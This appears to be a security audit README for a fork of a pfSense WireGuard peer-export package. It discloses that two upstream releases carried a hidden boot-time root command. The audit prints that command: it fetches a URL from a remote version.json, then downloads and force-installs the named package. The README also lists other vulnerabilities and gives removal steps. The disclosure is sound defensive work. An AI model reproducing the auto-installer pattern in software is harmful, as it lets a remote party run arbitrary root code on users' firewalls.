# Security audit and fork rationale

This is a hardened fork of [3um3le3ee/pfSense-wireguard-peer-export](https://github.com/3um3le3ee/pfSense-wireguard-peer-export).
It exists because the upstream project distributes **compiled `.pkg` binaries with
the source removed**, and an audit of those binaries found a remote-controlled
auto-installer in two published releases.

Everything below was established by static analysis of the three `.pkg` files
preserved in [`upstream/`](upstream/) and of the deleted blobs recovered from
upstream's git history. Nothing was executed on a live firewall.

---

## 1. Upstream provenance

Upstream's git history shows a repeating pattern: source files are committed,
then deleted in a later commit, leaving only a binary.

```
73d61a5 Add files via upload      A vpn_wg_export.php, vpn_wg_setup.php, ...
53fbce0 Add files via upload      A pfSense-pkg-wg-export-1.0.9.pkg
...
0f2edac Delete vpn_wg_setup.php   D vpn_wg_setup.php
340da80 Delete vpn_wg_dashboard.php
454eb37 Delete vpn_wg_export.php
2084019 Delete wgx_expire.php
3760822 Delete wg_peer_export.widget.php
7f4c290 Delete version.json
221d826 Add files via upload      A pfSense-pkg-wg-export-1.1.0.pkg
```

The deleted blobs remain recoverable via `git cat-file`, but **they do not
correspond to any shipped binary**. The recovered `vpn_wg_export.php` is
122,392 bytes; the copy inside `pfSense-pkg-wg-export-1.0.9.pkg` is 139,239
bytes. The package also contains files (`vpn_wg_audit.php`,
`vpn_wg_credits.php`) that were never committed at all.

There is therefore no way to verify upstream's binaries against upstream's
source. This fork resolves that by treating the extracted package contents as
the authoritative source, committing them in full, and building with a
deterministic builder (see [Reproducible builds](#4-reproducible-builds)).

---

## 2. Critical: remote-controlled auto-installer in 1.0.8 and 1.0.9

**Severity: critical. Affects `pfSense-pkg-wg-export-1.0.8.pkg` and
`pfSense-pkg-wg-export-1.0.9.pkg`. Not present in 1.1.0.**

Both packages carry a `post-install` script in their `+MANIFEST`. Section
9.B.7 of that script writes a boot-time root command into pfSense's
`config.xml`:

```php
$bootstrap_cmd = "/usr/local/bin/php -r \"if(!file_exists('/usr/local/www/wgx/vpn_wg_export.php')){
  \$j=@json_decode(@file_get_contents('https://raw.githubusercontent.com/3um3le3ee/pfSense-wireguard-peer-export/main/version.json'),true);
  if(!empty(\$j['url'])){ shell_exec('fetch -o /tmp/wg_boot.pkg '.escapeshellarg(\$j['url']).' && pkg add -fM /tmp/wg_boot.pkg'); } }\"";

$config['system']['shellcmd'][] = $bootstrap_cmd;
```

pfSense executes every entry in `system/shellcmd` as root at each boot. So on
every boot, if the package's files are missing, the firewall fetches
`version.json` from the author's GitHub `main` branch, reads its `url` field,
downloads whatever it names, and installs it with `pkg add -fM` (force,
skip dependency checks) as root.

The `url` field is a live payload pointer. Recovered from history:

```json
{ "version": "1.0.81",
  "url": ".../releases/download/v1.0.8/pfSense-pkg-wg-export-1.0.81.pkg",
  "notes": "UPDATE TEST" }
```

Whoever controls that repository — the author, or anyone who compromises the
account — can point it at an arbitrary package and have it installed as root
on every affected firewall that reboots.

**Current state, stated precisely:** `version.json` has been deleted from the
repository, so the fetch returns a 404, `json_decode` yields null, and nothing
installs. The mechanism is **inert but re-armable by re-adding a single file**.

**Persistence:** the stated purpose is surviving pfSense upgrades. Upgrades
replace `/usr/local/www` but preserve `config.xml`, so the `shellcmd` outlives
them. A clean `pkg delete` does remove it via `post-deinstall`.

### Checking and removing it

If this system ever had 1.0.8 or 1.0.9 installed, check for the entry:

```sh
grep -n 'raw.githubusercontent.com/3um3le3ee' /conf/config.xml
```

Any match must be removed via **System → Advanced → Shellcmd** in the WebGUI
(hand-editing `config.xml` risks corrupting it). Reboot afterwards and confirm
the grep returns nothing. `audit.sh` in this repo also reports it.

---

## 3. Findings in 1.1.0 (this fork's base)

1.1.0 removed the auto-installer and fixed several classes of bug present in
1.0.9. Verified fixed upstream, not re-fixed here:

| Issue | 1.0.9 | 1.1.0 |
|---|---|---|
| Boot-persistence auto-installer | present | **removed** |
| Shell execution | `shell_exec` with string interpolation throughout | array-form `proc_open`, no shell |
| WireGuard private key in `argv` | `echo <key> \| wg pubkey`, visible in `ps` | passed via stdin |
| Dashboard XSS | `innerHTML` with unescaped peer name | `escH()` applied at 18 sites |
| S2S XMLRPC TLS | `SSL_VERIFYPEER=false` while sending admin creds + private key | verification on by default, configurable |

Issues that remained in 1.1.0 and are addressed by this fork:

### 3.1 Cron script published into the web root

**Severity: medium.** 1.1.0 moved `wgx_expire.php` from `/usr/local/pkg/`
(1.0.9) to `/usr/local/www/wgx/`, making it HTTP-reachable. It requires only
`config.inc`/`util.inc` — not `guiconfig.inc`, which is what enforces
authentication in pfSense — so anyone able to reach the WebGUI can trigger a
config-mutating maintenance run (peer expiry, schedule toggling, AD sync,
SMTP notifications). Fixed by moving it back out of the web root.

### 3.2 Unauthenticated GPS check-in endpoint

**Severity: medium (privacy).** `vpn_wg_checkin.php` is unauthenticated by
design, gated on a per-peer token, and records peer coordinates to
`/var/db/wgx_gps_locations.json`. Tokens travel in the URL query string, so
they leak into web server logs, browser history, and `Referer` headers. A
peer-export tool that also tracks phone locations is a surprising default.
Removed in this fork.

### 3.3 Third-party geolocation over plaintext HTTP

**Severity: medium.** `vpn_wg_map.php` queries `http://ip-api.com/json/...`
over unencrypted HTTP for the firewall's WAN address and for peer endpoint
addresses, exposing them to any on-path observer. (`wgx_expire.php` uses HTTPS
for the same service, so this was inconsistent rather than deliberate.)
Removed along with the map.

### 3.4 WebSocket tunnel daemon with authentication off by default

**Severity: medium.** `wgx/tunnel/wg_ws_server.php` binds `0.0.0.0`, requires
root to take port 443, and enables authentication only when `WG_WS_TOKEN` is
set — which the shipped `rc.d` script never exports. Following the documented
setup therefore yields an unauthenticated WebSocket-to-WireGuard bridge. The
matching client sets `verify_peer => false`. Disabled by default upstream
(`wg_ws_server_enable="NO"`), but removed here.

### 3.5 Non-constant-time token comparison

**Severity: low.** `wgexport.inc`'s `wgx_find_peer_by_token()` compares tokens
with `===`, which short-circuits on the first differing byte, while
`vpn_wg_checkin.php` uses `hash_equals()` for the same value.

### 3.6 WebSocket remnants in the export page

**Severity: low.** Removing the WebSocket daemon (3.4) initially left its
consumers in `vpn_wg_export.php` on the grounds that they were unreachable.
They were unreachable, but not inert: the Add Peer form still rendered a
"WebSocket Override" field whose value was parsed from `$_POST` and stored on
the peer where nothing read it, and the create-peer handler still honoured
`$_POST["transport"]`, so a hand-crafted POST could flag a peer as WebSocket
transport and thereby disable the UI's ability to email that peer's config.
The generated `.conf` was never affected — the endpoint-substitution branch
also required a WebSocket tunnel config, which can no longer exist. Removed
along with the migrate-to-WebSocket handler, modal and JavaScript.

---

## 4. Verification

`php -l` proves a file parses; it cannot see a call to a deleted function or a
stale variable inside a `<?= ?>` tag, both of which are fatals on first page
load. Two comparative checks run the fork against the upstream package it
descends from, so only regressions introduced here are reported:

```sh
make test      # lint, structure, call graph, render
```

`make callgraph` walks both trees with PHP's own lexer and reports any
function the fork calls but no longer defines. `make render` executes all five
WebGUI pages against a stub pfSense and diffs fatals, runtime diagnostics and
HTML tag balance against upstream. Both need `php` but not pfSense; neither
writes config or runs commands.

This is not a substitute for testing on a real firewall — it does not exercise
POST handlers or prove behaviour on FreeBSD.

---

## 5. Reproducible builds

`build.py` produces byte-identical output from identical source: fixed mtimes
(`SOURCE_DATE_EPOCH`, default 0), uid/gid 0, and normalised file modes.
Upstream shipped a mix of `0600`, `0644` and `0711` — build-box artifacts;
this fork uses `0644` for data and `0755` for executables.

This matters because releases publish a binary. A binary you cannot check is
exactly the upstream problem this fork exists to answer, so the check has to be
something a reader can actually run:

```sh
make build                                                    # prints the sha256
python3 build.py --verify /path/to/downloaded.pkg             # compares every file
```

`make build` on any machine, from the tag a release was built at, must print
the `sha256` in that release's notes. If it does not, the published binary was
not built from the published source — do not install it.

The release workflow builds twice and refuses to publish if the two builds
disagree, so a non-reproducible build fails loudly instead of shipping.

---

## 6. Scope and limits of this audit

Static analysis only; nothing was run on a live firewall. Coverage was focused
on the classes most likely to matter — install-time scripts, authentication
guards, command execution, TLS verification, output escaping, key handling,
and outbound network calls. `vpn_wg_export.php` alone is over 10,000 lines,
and full line-by-line review of the whole codebase was not performed. Absence
of a finding here is not proof of absence.

## Reporting

Open an issue on this fork. For upstream issues, contact the upstream author.
